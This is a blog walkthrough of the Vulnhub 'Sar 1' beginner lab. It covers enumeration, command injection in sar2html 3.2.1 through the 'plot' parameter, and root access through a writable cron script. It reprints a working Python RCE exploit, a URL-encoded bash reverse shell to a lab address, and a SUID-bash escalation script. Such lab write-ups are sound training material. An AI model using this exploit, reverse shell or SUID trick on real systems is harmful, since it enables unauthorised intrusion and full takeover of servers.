+++
title = "Vulnhub: Sar 1"
date = "2021-05-13"
author = ""
authorTwitter = "" #do not include @
tags = ["Beginner", "Vulnhub", "OSCP Prep", "sar2html", "Cron"]
keywords = ["", ""]
description = ""
showFullContent = false
cover = "/img/sar1/sar1.png"
+++



| Difficulty | Release Date | Author |
| ---------- | ------------ | ------ |
| Beginner | 15 Feb 2020 | Love |

# Summary

In this box there's only one port open that is running a vulnerable version of sar2html that
we take advantage of to get a low priv shell. For privilege escalation there was a cron job
running as root that was running a script we could write in.

# Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.56.107
Host is up (0.000040s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 08:00:27:48:00:F5 (Oracle VirtualBox virtual NIC)
```

# Enumeration

## 80 (HTTP)

Using nmap scripts we see the existence of robots.txt

```sh
Nmap scan report for 192.168.56.107
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum:
|   /robots.txt: Robots file
|_  /phpinfo.php: Possible information file
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
From this we discover sar2HTML.

{{< image src="/img/sar1/sar1-01.png" alt="" position="center" style="border-radius: 8px;" >}}

Visiting this directory I get the version of sar2html as 3.2.1.

{{< image src="/img/sar1/sar1-02.png" alt="" position="center" style="border-radius: 8px;" >}}

Checking on searchsploit, a remote command execution vulnerability exists for this version.

```sh
searchsploit sar2html
```

{{< image src="/img/sar1/sar1-03.png" alt="" position="center" style="border-radius: 8px;" >}}

# Shell as user

By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.

script url: [https://www.exploit-db.com/exploits/49344](https://www.exploit-db.com/exploits/49344)

```
~/Vulnhub/Sar1  python3 49344.py

Enter The url => http://192.168.56.107/sar2HTML/
Command => id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Command => /bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/192.168.56.1/9000+0>%261'
```

{{< image src="/img/sar1/sar1-04.png" alt="" position="center" style="border-radius: 8px;" >}}

Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
I found a cron job running as root.

{{< image src="/img/sar1/sar1-05.png" alt="" position="center" style="border-radius: 8px;" >}}

While we can't write to this file, the script being executed inside it is writeable.

{{< image src="/img/sar1/sar1-06.png" alt="" position="center" style="border-radius: 8px;" >}}


# Shell as root

By writing into write.sh using vi, we can escalate our privileges.

```
#!/bin/sh

cp /bin/bash /var/www/html/suidbash
chmod u+s /var/www/html/suidbash
```

This will create a copy of the bash binary and add suid permissions to it.

Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.

{{< image src="/img/sar1/sar1-07.png" alt="" position="center" style="border-radius: 8px;" >}}

# Extras

Understanding the exploit script and perform the exploit manually. 

To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.

```py
# Exploit Title: sar2html 3.2.1 - 'plot' Remote Code Execution
# Date: 27-12-2020
# Exploit Author: Musyoka Ian
# Vendor Homepage:https://github.com/cemtan/sar2html
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1
# Tested on: Ubuntu 18.04.1

#!/usr/bin/env python3

import requests
import re
from cmd import Cmd

url = input("Enter The url => ")

class Terminal(Cmd):
    prompt = "Command => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()% 
```

According to the script the vulnerable parameter is plot and simply takes in our command and executes it.

When interacting with the application you can select OS, when you pick one the plot parameter is used.

{{< image src="/img/sar1/sar1-08.png" alt="" position="center" style="border-radius: 8px;" >}}

Here we can inject the command we want and execute shell commands. The OS option doesn't matter, anything after
the semi-colon `;` will be executed. For the reverse shell command remember to url encode special chars like I did
above

{{< image src="/img/sar1/sar1-09.png" alt="" position="center" style="border-radius: 8px;" >}}

Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.

[https://musyokaian.medium.com/](https://musyokaian.medium.com/)
